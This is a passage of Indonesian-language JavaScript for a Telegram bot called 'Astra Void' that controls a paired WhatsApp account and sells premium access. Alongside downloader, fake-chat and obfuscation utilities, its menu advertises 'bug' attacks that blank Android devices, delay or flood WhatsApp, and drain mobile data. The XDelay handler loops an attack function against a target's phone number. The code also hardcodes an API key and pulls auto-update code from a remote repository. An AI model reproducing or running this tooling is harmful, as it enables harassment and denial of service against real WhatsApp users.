        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234VOID");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`js
⬡═―—⊱ ⎧ ASTRA VOID ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`js
 ⬡═―—⊱ ⎧ ASTRA VOID ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

// ==============================
// CONTOH COMMAND
// ==============================
// ==============================
// CONTOH COMMAND
// ==============================
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  // ============================
  // 🔓 OWNER BYPASS FULL
  // ============================
  if (!isOwner) {
    // Jika user buka di private → blokir
    if (ctx.chat.type === "private") {
      // Kirim notifikasi ke owner
      bot.telegram.sendMessage(
        ownerID,
        `📩 *NOTIFIKASI START PRIVATE*\n\n` +
        `👤 User: ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 ID: <code>${ctx.from.id}</code>\n` +
        `🔗 Username: @${ctx.from.username || "-"}\n` +
        `💬 Akses private diblokir.\n\n` +
        `⌚ Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }
  
 
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}

  const menuMessage = `\`\`\`js
🕊️ Olaa - @${ctx.from.username || "Tidak Ada"} ボットスクリプトへようこそ Astra Void スクリプト経由 Telegram 

INFORMATION BOT
⎔ Owner Real : @XerozNotDev
⎔ Version : 1.0 - Pro Version 
⎔ Type : Telegraf 

STATUS BOT
⎔ Status Premium : ${premiumStatus}
⎔ Status Sender : ${senderStatus}  
⎔ Run Time : ${runtimeStatus}

⬡═—⊱ ⚔️ SILAHKAN TAP BUTTON ⤵️ ⊰—═⬡
\`\`\``;

  const keyboard = [
        [
            { text: "⬅️", callback_data: "gads" }, 
            { text: "Home", callback_data: "/start" },
            { text: "➡️", callback_data: "/controls" }
        ],
        [
            { text: "Channel Resmi", url: "https://t.me/InformationXeroz" }
        ]
    ];

   ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();

  const menuMessage = `\`\`\`js
🕊️ Olaa - @${ctx.from.username || "Tidak Ada"} ボットスクリプトへようこそ Astra Void スクリプト経由 Telegram 

INFORMATION BOT
⎔ Owner Real : @XerozNotDev
⎔ Version : 1.0 - Pro Version 
⎔ Type : Telegraf 

STATUS BOT
⎔ Status Premium : ${premiumStatus}
⎔ Status Sender : ${senderStatus}  
⎔ Run Time : ${runtimeStatus}

⬡═—⊱ ⚔️ SILAHKAN TAP BUTTON ⤵️ ⊰—═⬡
\`\`\``;

  const keyboard = [
        [
            { text: "⬅️", callback_data: "gads" }, 
            { text: "Home", callback_data: "/start" },
            { text: "➡️", callback_data: "/controls" }
        ],
        [
            { text: "Channel Resmi", url: "https://t.me/InformationXeroz" }
        ]
    ];


    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "Markdown",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `\`\`\`js
🕊️ Olaa - @${ctx.from.username || "Tidak Ada"} ボットスクリプトへようこそ Astra Void スクリプト経由 Telegram 

🔧 CONTROLLER ACCESS 
⎔ /update - System - Update
⎔ /addbot - Add Sender 
⎔ /killsesi - Reset Session
⎔ /setcd - Set Colldown 
⎔ /addprem - Add Prem
⎔ /delprem - Del Prem
⎔ /addpremgrup - Add Group 
⎔ /delpremgrup - Del Group 
⎔ /GroupMode - Group Only 
⎔ /MatikanMode - Matikan Mode
⎔ /CheckMode - Check Mode

⬡═—⊱ ⚔️ SILAHKAN TAP BUTTON ⤵️ ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "⬅️", callback_data: "/start" }, 
            { text: "Home", callback_data: "/start" },
            { text: "➡️", callback_data: "/bug" }
        ],
        [
            { text: "Channel Resmi", url: "https://t.me/InformationXeroz" }
        ]
    ];


    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `\`\`\`js
🕊️ Olaa - @${ctx.from.username || "Tidak Ada"} ボットスクリプトへようこそ Astra Void スクリプト経由 Telegram 

📜 DESTROYED MENU 
⎔ /BlankAndroid - Blank Android
⎔ /XDelay - Delay duration hard
⎔ /Magic - Sedot Kuota 1mb/s  
⎔ /buldozer - Sedot Kuota 3mb/s
 
⚔️ BEBAS SPAM MENU ⚔️
⎔ /OverHard - Bebas Spam Delay
⎔ /OverLow - Bebas Spam Delay

⬡═—⊱ ⚔️ SILAHKAN TAP BUTTON ⤵️ ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "⬅️", callback_data: "/controls" }, 
            { text: "Home", callback_data: "/start" },
            { text: "➡️", callback_data: "/tqto" }
        ],
        [
            { text: "Channel Resmi", url: "https://t.me/InformationXeroz" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `\`\`\`js
⬡═—⊱ ⚔️ ASTRA VOID SCRAPE ⚔️ ⊰—═⬡
🕊️ Olaa - @${ctx.from.username || "Tidak Ada"} ボットスクリプトへようこそ Astra Void スクリプト経由 Telegram 

💫 THANKS TO KEPADA
⎔ Developer - @XerozNotDev
⎔ Support - @Xatanicvxii
⎔ Support - @xwarrxxx
⎔ Support - @NarendraRajaIblis
⎔ Friend - @Ngkaa73
⎔ All Buyyer Astra Void 

⬡═—⊱ ⚔️ SILAHKAN TAP BUTTON ⤵️ ⊰—═⬡
\`\`\``;

    const keyboard = [
        [
            { text: "⬅️", callback_data: "/bug" }, 
            { text: "Home", callback_data: "/start" },
            { text: "➡️", callback_data: "/controls" }
        ],
        [
            { text: "Channel Resmi", url: "https://t.me/InformationXeroz" }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tqto menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

//------------------(AUTO - UPDATE SYSTEM)--------------------//
bot.command("update", async (ctx) => {

  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Khusus owner.");
  }

  const fileUrl = "https://raw.githubusercontent.com/agungdermawan22332-sys/Vloid-Update/main/Destoryed.js";
  const filePath = "./Destoryed.js";

  await ctx.reply("⏳ Auto Update Script Mohon Tunggu...");

  const file = fs.createWriteStream(filePath);

  https.get(fileUrl, (res) => {

    if (res.statusCode !== 200) {
      ctx.reply("❌ Gagal download file update.");
      return;
    }

    res.pipe(file);

    file.on("finish", () => {
      file.close(() => {
        ctx.reply("📄 File Ditemukan\n✅ Update Berhasil\n♻ Restarting bot...");
        setTimeout(() => process.exit(0), 2000);
      });
    });

  }).on("error", (err) => {
    console.log(err);
    ctx.reply("❌ Terjadi kesalahan saat update.");
  });

});

//------------------(ALL CASE BUG)--------------------//
bot.command("XDelay",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /XDelay 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // ✅ kirim pesan awal
    const sentMessage = await ctx.reply( `\`\`\`js
⚔️ ASTRA VOID BUG ⚔️
Initiate Bug to target

Target : ${q}
Type : Delay Duration 
Loop : 30
Proses : MENGIRIM

⏳ Please Wait 5 Minutes
No Spam Bugs Allowed 
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "<👁️‍🗨️> CHECK", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );

    const msgId = sentMessage.message_id;

    // 🚀 langsung eksekusi (tanpa loading)
    for (let i = 0; i < 50; i++) {
      await epcihDiley(sock, target);
      await sleep(1000);
    }

    // ✅ edit jadi sukses
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msgId,
      undefined,`\`\`\`js
⚔️ ASTRA VOID BUG ⚔️
Success Send To target

Target : ${q}
Type : Delay Duration 
Loop : 30
Proses : BERHASIL 

⏳ Please Wait 5 Minutes
No Spam Bugs Allowed 
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
             { text: "<👁️‍🗨️> CHECK", url: `https://wa.me/${q}` }
          ]]
        }
      }
    );
  }
);

bot.command("BlankAndroid",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /BlankAndroid 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    // ✅ kirim pesan awal
